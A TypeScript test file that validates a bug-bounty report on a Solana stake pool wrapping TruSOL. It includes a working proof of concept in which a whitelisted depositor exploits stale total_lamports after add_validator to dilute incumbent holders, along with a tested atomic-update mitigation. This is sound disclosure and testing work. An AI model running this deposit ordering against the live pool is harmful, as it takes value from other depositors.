/**
 * Validation of the Immunefi report claiming that a whitelisted depositor can
 * capture part of the owner-funded validator stake that `add_validator` injects
 * into the pool.
 *
 * `process_add_validator` transfers `rent + minimum_delegation` of the OWNER's own
 * SOL into the pool reserve and then CPIs into the canonical
 * `AddValidatorToPool`, which splits those lamports into the new validator stake
 * account. The canonical instruction does not touch `StakePool.total_lamports`
 * (for the canonical flow the lamports were already pool-owned, so there is
 * nothing to account for) and it leaves `last_update_epoch` at the current epoch.
 *
 * The result is a window in which the pool controls more assets than
 * `total_lamports` records, while the deposit freshness check still passes. A
 * deposit landing in that window mints TruSOL at the pre-donation share price
 * and, at the next `UpdateStakePoolBalance`, captures a pro-rata slice of the
 * owner's donation.
 *
 * The three scenarios below are identical except for WHEN the permissionless pool
 * update happens relative to the attacker's deposit — after it, before it, or
 * bundled into the add_validator transaction — so the differences isolate both the
 * bug and the mitigation.
 *
 * Pool fees mirror the live TruSOL pool (EyKyx9LKz7Qbp6PSbBRoMdt8iNYp8PvFVupQTQRMY9AM):
 * 5% epoch fee, 0.1% stake withdrawal fee, 0% SOL deposit fee.
 */
import * as anchor from "@coral-xyz/anchor";
import { web3, BN } from "@coral-xyz/anchor";
import {
  Keypair,
  PublicKey,
  SystemProgram,
  StakeProgram,
  LAMPORTS_PER_SOL,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import { Staker } from "../target/types/staker";
import {
  STAKE_POOL_PROGRAM_ID,
  initStaker,
  requestAirdrop,
  createStakePool,
  addUserToWhitelist,
  getStakePool,
  updatePoolStakeBalance,
  deposit,
  decodeValidatorListAccount,
  setupConfirmedProvider,
  StakePoolFees,
} from "./helpers";
import { CreateStakePoolResponse } from "./stake_pool/types";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
} from "@solana/spl-token";

import { assert } from "chai";

// fees of the live TruSOL pool
const PRODUCTION_FEES: StakePoolFees = {
  epochFee: { numerator: 5, denominator: 100 },
  withdrawalFee: { numerator: 1, denominator: 1000 },
  depositFee: { numerator: 0, denominator: 100 },
};

const INCUMBENT_DEPOSIT = 24 * LAMPORTS_PER_SOL;
const ATTACKER_DEPOSIT = 10 * LAMPORTS_PER_SOL;

/**
 * - update-first:   honest control, pool is reconciled before the attacker deposits
 * - deposit-first:  the exploit, attacker deposits while total_lamports is stale
 * - atomic-add:     proposed mitigation, add_validator and UpdateStakePoolBalance
 *                   are submitted as two instructions in ONE transaction
 */
type Mode = "update-first" | "deposit-first" | "atomic-add";

type ScenarioResult = {
  name: string;
  donation: number;
  recordedLamportsBeforeAdd: number;
  recordedLamportsAfterAdd: number;
  attackerTokens: number;
  attackerMintPrice: number;
  attackerRealized: number;
  attackerPnl: number;
  incumbentTokens: number;
  incumbentClaim: number;
  managerFeeTokens: number;
  finalSharePrice: number;
  slotsConsumed: number;
};

const sol = (lamports: number) => (lamports / LAMPORTS_PER_SOL).toFixed(9);

/**
 * A scenario has to run inside a single epoch. `Initialize` stamps
 * `last_update_epoch`, and `AddValidatorToPool`, `DepositSol` and `WithdrawStake`
 * all reject a pool whose `last_update_epoch` is behind the current epoch
 * (`StakeListAndPoolOutOfDate`, custom program error 0x11). Crossing a boundary
 * leaves only bad options: skip the update and the next instruction fails, or
 * update and the donation is absorbed into `total_lamports` — which silently
 * turns the exploit branch into the control branch and reports a false pass.
 * A boundary also folds real inflation rewards into `total_lamports`, which would
 * break the exact cross-branch equality this test relies on.
 *
 * A scenario measures ~14 slots end to end (logged below), so 128 leaves ample
 * margin. `test.sh` gives this file a long epoch via SLOTS_PER_EPOCH_OVERRIDES;
 * the guard below is a safety net for anyone running it against a short-epoch
 * validator, where it skips rather than reporting a misleading pass.
 */
const SLOTS_NEEDED_PER_SCENARIO = 128;

describe("add_validator owner-donation window", () => {
  const provider = setupConfirmedProvider();
  const connection = provider.connection;

  let program: anchor.Program<Staker>;
  let owner: anchor.Wallet;
  let stakeManager: Keypair;
  let stakerAuthorityPDA: PublicKey;
  let validatorVoteAccount: PublicKey;
  let stakeAccountRent: number;

  before(async function () {
    const { slotsInEpoch } = await connection.getEpochInfo();
    if (slotsInEpoch < SLOTS_NEEDED_PER_SCENARIO) {
      console.log(
        `\n  SKIPPED: epoch is ${slotsInEpoch} slots, need >= ${SLOTS_NEEDED_PER_SCENARIO}.` +
          `\n  Run via ./test.sh, which gives this file a long epoch` +
          ` (see SLOTS_PER_EPOCH_OVERRIDES).\n`
      );
      this.skip();
    }

    owner = provider.wallet as anchor.Wallet;
    stakeManager = Keypair.generate();

    const voteAccounts = (await connection.getVoteAccounts())?.current;
    if (!voteAccounts || voteAccounts.length === 0) {
      throw new Error("No vote account found");
    }
    validatorVoteAccount = new PublicKey(voteAccounts[0].votePubkey);

    program = await initStaker(owner.publicKey, stakeManager.publicKey);

    [stakerAuthorityPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from("staker")],
      program.programId
    );

    stakeAccountRent = await connection.getMinimumBalanceForRentExemption(
      StakeProgram.space
    );
  });

  /**
   * Blocks until the current epoch has enough slots left to finish a scenario,
   * so a scenario never starts just before a boundary.
   */
  async function waitForEpochHeadroom(): Promise<void> {
    for (;;) {
      const { slotIndex, slotsInEpoch } = await connection.getEpochInfo();
      if (slotsInEpoch - slotIndex >= SLOTS_NEEDED_PER_SCENARIO) return;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }

  /** Hands the pool's staker authority to the Staker program PDA. */
  async function setStakerAuthorityToPDA(
    stakePool: PublicKey,
    manager: Keypair
  ) {
    const setStakerIx = new TransactionInstruction({
      programId: STAKE_POOL_PROGRAM_ID,
      keys: [
        { pubkey: stakePool, isSigner: false, isWritable: true },
        { pubkey: manager.publicKey, isSigner: true, isWritable: false },
        { pubkey: stakerAuthorityPDA, isSigner: false, isWritable: false },
      ],
      data: Buffer.from(Uint8Array.of(13)), // SetStaker
    });
    await provider.sendAndConfirm(new Transaction().add(setStakerIx), [manager]);
  }

  /** The canonical permissionless UpdateStakePoolBalance instruction. */
  function updateStakePoolBalanceIx(
    accounts: CreateStakePoolResponse["accounts"]
  ): TransactionInstruction {
    return new TransactionInstruction({
      programId: STAKE_POOL_PROGRAM_ID,
      keys: [
        { pubkey: accounts.stakePoolAccount, isSigner: false, isWritable: true },
        { pubkey: accounts.withdrawAuthorityAccount, isSigner: false, isWritable: false },
        { pubkey: accounts.validatorListAccount, isSigner: false, isWritable: true },
        { pubkey: accounts.reserveStakeAccount, isSigner: false, isWritable: false },
        { pubkey: accounts.feesTokenAccount, isSigner: false, isWritable: true },
        { pubkey: accounts.poolMintAccount, isSigner: false, isWritable: true },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      ],
      data: Buffer.from(Uint8Array.of(7)), // UpdateStakePoolBalance
    });
  }

  async function tokenBalance(ata: PublicKey): Promise<number> {
    const balance = await connection.getTokenAccountBalance(ata);
    return Number(balance.value.amount);
  }

  /**
   * Exits the whole TruSOL position through the canonical, permissionless
   * WithdrawStake instruction, splitting out of the reserve into a stake account
   * the user controls. Returns the lamports actually received.
   *
   * Splitting from the reserve is only legal while no validator holds withdrawable
   * stake: `process_withdraw_stake` rejects the reserve when any validator's
   * `active_stake_lamports` exceeds `required_lamports + lamports_per_pool_token`.
   * That holds here because the pool's single validator was just added and sits
   * exactly at `required_lamports`, and it is also why the reserve is the only
   * viable source — the validator holds ~1 SOL while the exit is ~10 SOL.
   *
   * Adding stake to the validator in this suite would therefore break these
   * withdrawals with `StakeLamportsNotEqualToMinimum`. Compare the deliberate
   * contrast case in withdrawals.test.ts, which calls
   * `increaseAdditionalValidatorStake` first and asserts the reserve is refused.
   */
  async function withdrawAllStake(
    user: Keypair,
    userATA: PublicKey,
    tokens: number,
    accounts: CreateStakePoolResponse["accounts"]
  ): Promise<number> {
    const destination = Keypair.generate();

    const createAccountIx = SystemProgram.createAccount({
      fromPubkey: user.publicKey,
      newAccountPubkey: destination.publicKey,
      lamports: stakeAccountRent,
      space: StakeProgram.space,
      programId: StakeProgram.programId,
    });
    await provider.sendAndConfirm(
      new Transaction().add(createAccountIx),
      [destination, user],
      { commitment: "confirmed" }
    );

    const withdrawStakeIx = new TransactionInstruction({
      programId: STAKE_POOL_PROGRAM_ID,
      keys: [
        { pubkey: accounts.stakePoolAccount, isSigner: false, isWritable: true },
        { pubkey: accounts.validatorListAccount, isSigner: false, isWritable: true },
        { pubkey: accounts.withdrawAuthorityAccount, isSigner: false, isWritable: false },
        { pubkey: accounts.reserveStakeAccount, isSigner: false, isWritable: true },
        { pubkey: destination.publicKey, isSigner: false, isWritable: true },
        { pubkey: user.publicKey, isSigner: false, isWritable: false }, // new stake authority
        { pubkey: user.publicKey, isSigner: true, isWritable: false }, // pool token transfer authority
        { pubkey: userATA, isSigner: false, isWritable: true },
        { pubkey: accounts.feesTokenAccount, isSigner: false, isWritable: true },
        { pubkey: accounts.poolMintAccount, isSigner: false, isWritable: true },
        { pubkey: web3.SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        { pubkey: StakeProgram.programId, isSigner: false, isWritable: false },
      ],
      data: Buffer.concat([
        Buffer.from(Uint8Array.of(10)), // WithdrawStake
        new BN(tokens).toArrayLike(Buffer, "le", 8),
      ]),
    });

    await provider.sendAndConfirm(
      new Transaction().add(withdrawStakeIx),
      [user],
      { commitment: "confirmed" }
    );

    // the destination stake account holds the rent the user pre-funded plus the
    // stake split out of the pool
    const balance = await connection.getBalance(destination.publicKey);
    return balance - stakeAccountRent;
  }

  /**
   * Runs the full lifecycle on a freshly created pool. The only difference
   * between the branches is `mode`, i.e. when the permissionless pool update
   * happens relative to the attacker's deposit.
   */
  async function runScenario(
    name: string,
    mode: Mode
  ): Promise<ScenarioResult> {
    const manager = Keypair.generate();
    const poolStaker = Keypair.generate();
    const incumbent = Keypair.generate();
    const attacker = Keypair.generate();

    await requestAirdrop(connection, incumbent.publicKey, 100);
    await requestAirdrop(connection, attacker.publicKey, 100);
    await addUserToWhitelist(program, incumbent.publicKey);
    await addUserToWhitelist(program, attacker.publicKey);

    // Everything from here on must stay inside one epoch: `Initialize` stamps
    // `last_update_epoch`, and every instruction below rejects a stale pool. Claim
    // the headroom here rather than earlier, so the setup transactions above cannot
    // spend the slots being reserved for the fragile span.
    await waitForEpochHeadroom();
    const epochInfoAtStart = await connection.getEpochInfo();
    const epochAtStart = epochInfoAtStart.epoch;
    const slotAtStart = epochInfoAtStart.absoluteSlot;

    const poolInfo = await createStakePool(
      program.programId,
      manager,
      poolStaker,
      PRODUCTION_FEES
    );
    const accounts = poolInfo.accounts;

    await setStakerAuthorityToPDA(accounts.stakePoolAccount, manager);

    const incumbentATA = await getAssociatedTokenAddress(
      accounts.poolMintAccount,
      incumbent.publicKey
    );
    const attackerATA = await getAssociatedTokenAddress(
      accounts.poolMintAccount,
      attacker.publicKey
    );

    // ---- an incumbent TruSOL holder establishes the pre-existing supply ----
    await deposit(
      connection,
      program,
      new anchor.Wallet(incumbent),
      accounts,
      new BN(INCUMBENT_DEPOSIT)
    );
    const incumbentTokens = await tokenBalance(incumbentATA);

    const poolBeforeAdd = await getStakePool(
      connection,
      accounts.stakePoolAccount
    );
    const recordedLamportsBeforeAdd = Number(poolBeforeAdd.totalLamports);

    // the pool's recorded assets are exact and fresh at this point
    assert.equal(recordedLamportsBeforeAdd, INCUMBENT_DEPOSIT);
    assert.equal(Number(poolBeforeAdd.lastUpdateEpoch), epochAtStart);

    // ---- the owner adds a validator, funding it out of their own pocket ----
    const [validatorStakeAccount] = PublicKey.findProgramAddressSync(
      [validatorVoteAccount.toBuffer(), accounts.stakePoolAccount.toBuffer()],
      STAKE_POOL_PROGRAM_ID
    );

    const addValidatorIx = await program.methods
      .addValidator(0)
      .accounts({
        stakePool: accounts.stakePoolAccount,
        reserveStake: accounts.reserveStakeAccount,
        withdrawAuthority: accounts.withdrawAuthorityAccount,
        validatorList: accounts.validatorListAccount,
        validatorStakeAccount: validatorStakeAccount,
        validatorVoteAccount: validatorVoteAccount,
      })
      .instruction();

    // the mitigation: reconcile the pool in the SAME transaction as the add, so
    // no other transaction can ever observe the under-reported state
    const addTx = new Transaction().add(addValidatorIx);
    if (mode === "atomic-add") {
      addTx.add(updateStakePoolBalanceIx(accounts));
    }

    const ownerBalanceBeforeAdd = await connection.getBalance(owner.publicKey);
    await provider.sendAndConfirm(addTx, [owner.payer], {
      commitment: "confirmed",
    });
    const ownerBalanceAfterAdd = await connection.getBalance(owner.publicKey);

    // the owner's own SOL is now sitting in a pool-controlled stake account
    const donation = await connection.getBalance(validatorStakeAccount);
    assert.isAbove(ownerBalanceBeforeAdd - ownerBalanceAfterAdd, donation - 1);

    const validatorList = await decodeValidatorListAccount(
      connection,
      accounts.validatorListAccount
    );
    assert.equal(validatorList.validators.length, 1);
    assert.equal(
      Number(validatorList.validators[0].active_stake_lamports),
      donation,
      "the whole owner donation is recorded as validator active stake"
    );

    const poolAfterAdd = await getStakePool(
      connection,
      accounts.stakePoolAccount
    );
    const recordedLamportsAfterAdd = Number(poolAfterAdd.totalLamports);

    if (mode === "atomic-add") {
      // MITIGATED: the donation is already reflected, so there is no window at all
      assert.equal(
        recordedLamportsAfterAdd,
        recordedLamportsBeforeAdd + donation,
        "the bundled update reconciles the owner donation atomically"
      );
    } else {
      // THE BUG: pool assets grew by the donation, recorded assets did not, and
      // the pool still looks "fresh" so deposits are still accepted.
      assert.equal(
        recordedLamportsAfterAdd,
        recordedLamportsBeforeAdd,
        "total_lamports does not account for the owner donation"
      );
    }
    assert.equal(
      Number(poolAfterAdd.lastUpdateEpoch),
      epochAtStart,
      "the pool still passes the deposit freshness check"
    );

    const updatePool = () =>
      updatePoolStakeBalance(
        accounts.stakePoolAccount,
        accounts.withdrawAuthorityAccount,
        accounts.validatorListAccount,
        accounts.reserveStakeAccount,
        accounts.poolMintAccount,
        accounts.feesTokenAccount
      );

    const attackerDeposit = () =>
      deposit(
        connection,
        program,
        new anchor.Wallet(attacker),
        accounts,
        new BN(ATTACKER_DEPOSIT)
      );

    // ---- the only difference between the branches ----
    if (mode === "update-first") {
      await updatePool();
      await attackerDeposit();
    } else if (mode === "deposit-first") {
      await attackerDeposit();
      await updatePool();
    } else {
      // atomic-add: the pool is already reconciled, nothing left to race
      await attackerDeposit();
    }

    const attackerTokens = await tokenBalance(attackerATA);

    // ---- the attacker exits for real, via permissionless WithdrawStake ----
    const attackerRealized = await withdrawAllStake(
      attacker,
      attackerATA,
      attackerTokens,
      accounts
    );

    const poolFinal = await getStakePool(connection, accounts.stakePoolAccount);
    const finalSharePrice =
      Number(poolFinal.totalLamports) / Number(poolFinal.poolTokenSupply);

    const managerFeeTokens = await tokenBalance(accounts.feesTokenAccount);
    const incumbentClaim = Math.floor(incumbentTokens * finalSharePrice);

    const epochInfoAtEnd = await connection.getEpochInfo();
    const slotsConsumed = epochInfoAtEnd.absoluteSlot - slotAtStart;
    console.log(`  [${name}] consumed ${slotsConsumed} slots`);

    assert.equal(
      epochInfoAtEnd.epoch,
      epochAtStart,
      "scenario must run inside a single epoch to be a valid comparison"
    );

    return {
      name,
      donation,
      recordedLamportsBeforeAdd,
      recordedLamportsAfterAdd,
      attackerTokens,
      attackerMintPrice: ATTACKER_DEPOSIT / attackerTokens,
      attackerRealized,
      attackerPnl: attackerRealized - ATTACKER_DEPOSIT,
      incumbentTokens,
      incumbentClaim,
      managerFeeTokens,
      finalSharePrice,
      slotsConsumed,
    };
  }

  it("lets a deposit in the post-add window capture part of the owner's donation", async () => {
    const control = await runScenario("update-first (control)", "update-first");
    const exploit = await runScenario("deposit-first (exploit)", "deposit-first");
    const atomic = await runScenario("atomic add+update", "atomic-add");

    const incrementalAdvantage = exploit.attackerPnl - control.attackerPnl;
    const incumbentLoss = control.incumbentClaim - exploit.incumbentClaim;

    const col = (s: string) => s.padStart(15);
    console.log(`
=========================================================================================
 owner donation per add_validator .......... ${sol(exploit.donation)} SOL
 recorded total_lamports before add ........ ${sol(exploit.recordedLamportsBeforeAdd)} SOL
 recorded total_lamports after add ......... ${sol(exploit.recordedLamportsAfterAdd)} SOL  (unchanged)
 attacker capital .......................... ${sol(ATTACKER_DEPOSIT)} SOL
-----------------------------------------------------------------------------------------
                                 control          exploit          atomic add+update
                            (update first)   (deposit first)      (mitigation)
 TruSOL minted ......... ${col(control.attackerTokens.toString())}  ${col(exploit.attackerTokens.toString())}  ${col(atomic.attackerTokens.toString())}
 implied mint price .... ${col(control.attackerMintPrice.toFixed(9))}  ${col(exploit.attackerMintPrice.toFixed(9))}  ${col(atomic.attackerMintPrice.toFixed(9))}
 SOL realized on exit .. ${col(sol(control.attackerRealized))}  ${col(sol(exploit.attackerRealized))}  ${col(sol(atomic.attackerRealized))}
 attacker PnL .......... ${col(sol(control.attackerPnl))}  ${col(sol(exploit.attackerPnl))}  ${col(sol(atomic.attackerPnl))}
 incumbent claim ....... ${col(sol(control.incumbentClaim))}  ${col(sol(exploit.incumbentClaim))}  ${col(sol(atomic.incumbentClaim))}
 manager fee TruSOL .... ${col(control.managerFeeTokens.toString())}  ${col(exploit.managerFeeTokens.toString())}  ${col(atomic.managerFeeTokens.toString())}
-----------------------------------------------------------------------------------------
 incremental attacker advantage (exploit vs control) ... ${sol(incrementalAdvantage)} SOL
 incumbent claim loss .................................. ${sol(incumbentLoss)} SOL
 share of donation diverted ............................ ${((incumbentLoss / exploit.donation) * 100).toFixed(2)}%
 residual advantage under atomic mitigation ............ ${sol(atomic.attackerPnl - control.attackerPnl)} SOL
=========================================================================================`);

    // the donation is exactly rent + minimum delegation, funded by the owner
    assert.equal(exploit.donation, control.donation);

    // the exploit branch mints strictly more TruSOL for the same capital
    assert.isAbove(
      exploit.attackerTokens,
      control.attackerTokens,
      "deposit in the stale window mints at a cheaper price"
    );

    // and that excess is realizable as SOL, not just a preview mismatch
    assert.isAbove(
      exploit.attackerRealized,
      ATTACKER_DEPOSIT,
      "the attacker exits with more SOL than they deposited, after all pool fees"
    );
    assert.isBelow(
      control.attackerRealized,
      ATTACKER_DEPOSIT,
      "an honest depositor only loses the withdrawal fee"
    );

    // the gain comes out of the incumbent holder's claim
    assert.isBelow(
      exploit.incumbentClaim,
      control.incumbentClaim,
      "the incumbent holder is diluted by the stale-window deposit"
    );

    // conservation: what the attacker gained is what the incumbent lost
    assert.approximately(
      incrementalAdvantage,
      incumbentLoss,
      0.002 * LAMPORTS_PER_SOL,
      "attacker advantage is funded by the incumbent's forgone donation share"
    );

    // the leak is bounded by the size of the owner's donation
    assert.isBelow(
      incrementalAdvantage,
      exploit.donation,
      "the extractable value cannot exceed the owner's donation"
    );

    // ---- the mitigation leaves no window at all ----
    assert.equal(
      atomic.attackerTokens,
      control.attackerTokens,
      "bundling the update makes the immediate depositor mint at the true price"
    );
    assert.equal(
      atomic.attackerPnl,
      control.attackerPnl,
      "no residual advantage remains for a depositor in the next block"
    );
    assert.equal(
      atomic.incumbentClaim,
      control.incumbentClaim,
      "incumbents keep the whole donation under the atomic mitigation"
    );
  });
});
